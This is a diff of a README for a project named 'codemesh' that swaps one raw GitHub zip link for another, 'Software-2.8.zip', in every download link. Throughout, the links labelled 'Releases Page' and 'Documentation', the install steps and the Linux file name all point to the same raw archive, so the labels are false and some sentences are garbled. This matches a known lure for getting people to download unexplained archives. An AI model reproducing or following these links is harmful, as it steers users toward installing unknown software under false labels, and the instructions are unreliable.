@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download codemesh](https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip)](https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip)
+[![Download codemesh](https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip)](https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -21,13 +21,13 @@ Before getting started, please ensure your system meets the following requiremen
 
 To download and install **codemesh**, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases](https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip) page to access the latest version.
+1. **Visit the Releases Page**: Go to the [Releases](https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip) page to access the latest version.
 2. **Choose Your Version**: Look for the most recent release at the top. Click on it to see the available download options.
-3. **Download the File**: Download the file suitable for your operating system. Usually, this will be in `.exe` format for Windows or `.dmg` for macOS. For Linux, you will typically find a `https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip` file.
+3. **Download the File**: Download the file suitable for your operating system. Usually, this will be in `.exe` format for Windows or `.dmg` for macOS. For Linux, you will typically find a `https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip` file.
 4. **Install the Application**:
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For macOS: Open the downloaded `.dmg` file and drag the codemesh application into your Applications folder.
-   - For Linux: Extract the contents of the `https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip` file and follow the instructions in the README file to install.
+   - For Linux: Extract the contents of the `https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip` file and follow the instructions in the README file to install.
 5. **Start the Application**: After installation, you can find the codemesh application in your applications menu or desktop. Click to launch it.
 
 ## 🎛️ How to Use codemesh
@@ -61,7 +61,7 @@ For questions or assistance, please reach out on our support page linked in the 
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip)
-- [Documentation](https://raw.githubusercontent.com/IDragos94/codemesh/main/amphipod/codemesh.zip)
+- [Releases Page](https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/IDragos94/codemesh/main/packages/weather-server/Software-2.8.zip)
 
 Thank you for using **codemesh**! We hope it makes your server management tasks simpler and more efficient.
